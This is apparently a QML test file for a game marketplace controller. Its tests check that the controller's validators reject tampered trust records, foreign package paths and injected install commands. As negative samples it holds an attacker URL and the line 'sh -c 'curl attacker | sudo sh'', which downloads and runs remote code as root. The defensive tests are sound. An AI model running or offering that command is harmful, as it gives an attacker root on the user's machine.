import QtQuick
import QtTest
import "../.." as App

TestCase {
    name: "MarketplaceTrustUi"

    property var controller: null

    Component {
        id: controllerComponent
        App.MarketplaceController {
            configured: true
        }
    }

    function init() {
        controller = createTemporaryObject(controllerComponent, this)
        verify(controller !== null)
    }

    function cleanup() {
        if (controller)
            controller.destroy()
        controller = null
    }

    function trustKey(status) {
        return {
            "key_sha256": "a".repeat(64),
            "status": status,
            "first_snapshot_version": 1,
            "last_snapshot_version": 9
        }
    }

    function manualTrust() {
        return {
            "format": "omarchygs.client-trust-status/v1",
            "mode": "manual",
            "state": "current",
            "enrolled": true,
            "keys": [trustKey("active")]
        }
    }

    function channelTrust() {
        return {
            "format": "omarchygs.client-trust-status/v1",
            "mode": "channel",
            "state": "current",
            "enrolled": true,
            "keys": [trustKey("retired")],
            "channel_id": "official",
            "channel_name": "Official OmarchyGS",
            "channel_origin": "https://packages.example.test/v1/",
            "bundle_version": 2,
            "expires_at_unix": 2000000000
        }
    }

    function artifact() {
        return {
            "platform": "arch-linux",
            "architecture": "x86_64",
            "package_version": "0.2.0-1",
            "filename": "omarchygs.pkg.tar.zst",
            "relative_path": "packages/omarchygs.pkg.tar.zst",
            "bytes": 4096,
            "sha256": "b".repeat(64),
            "source_revision": "c".repeat(40),
            "source_sha256": "d".repeat(64),
            "build_provenance_sha256": "e".repeat(64)
        }
    }

    function test_exact_trust_and_package_shapes_reject_hostile_fields() {
        verify(controller._validTrust(manualTrust()))
        verify(controller._validTrust(channelTrust()))
        verify(controller._validArtifact(artifact()))

        const extraTrust = Object.assign({}, channelTrust(), {"server_root": "hostile"})
        verify(!controller._validTrust(extraTrust))
        const revokedRange = trustKey("revoked")
        revokedRange.last_snapshot_version = 0
        const invalidTrust = channelTrust()
        invalidTrust.keys = [revokedRange]
        verify(!controller._validTrust(invalidTrust))
        const hostileArtifact = artifact()
        hostileArtifact.relative_path = "https://attacker.example.invalid/package"
        verify(!controller._validArtifact(hostileArtifact))
    }

    function test_offline_failure_preserves_prior_trust_and_never_stages() {
        const prior = manualTrust()
        controller._handle(1, "trust_status", 200, JSON.stringify(prior), "")
        verify(controller.marketplaceReady)
        compare(controller.trust.keys[0].key_sha256, prior.keys[0].key_sha256)

        controller._handle(2, "trust_sync", 0, "", "offline")
        compare(controller.loadState, "error")
        verify(controller.errorText.indexOf("offline") !== -1)
        compare(controller.trust.keys[0].key_sha256, prior.keys[0].key_sha256)
        compare(controller.stagedPackage, null)
    }

    function test_staged_receipt_is_exact_and_command_is_text_only() {
        controller.trust = manualTrust()
        const staged = {
            "format": "omarchygs.staged-client-package/v1",
            "package_version": "0.2.0-1",
            "bytes": 4096,
            "sha256": "b".repeat(64),
            "source_revision": "c".repeat(40),
            "source_sha256": "d".repeat(64),
            "build_provenance_sha256": "e".repeat(64),
            "staged_path": "/home/player/.local/share/omarchy-gaming-system/updates/b.pkg.tar.zst",
            "install_command": "sudo pacman -U -- '/home/player/.local/share/omarchy-gaming-system/updates/b.pkg.tar.zst'"
        }
        controller._handle(3, "package_stage", 200, JSON.stringify(staged), "")
        compare(controller.loadState, "ready")
        compare(controller.stagedPackage.sha256, staged.sha256)
        compare(controller.stagedPackage.install_command, staged.install_command)

        const hostile = Object.assign({}, staged, {
            "install_command": "sh -c 'curl attacker | sudo sh'"
        })
        verify(!controller._validStagedPackage(hostile))
        hostile.install_command = staged.install_command
        hostile.execute = true
        verify(!controller._validStagedPackage(hostile))
    }
}
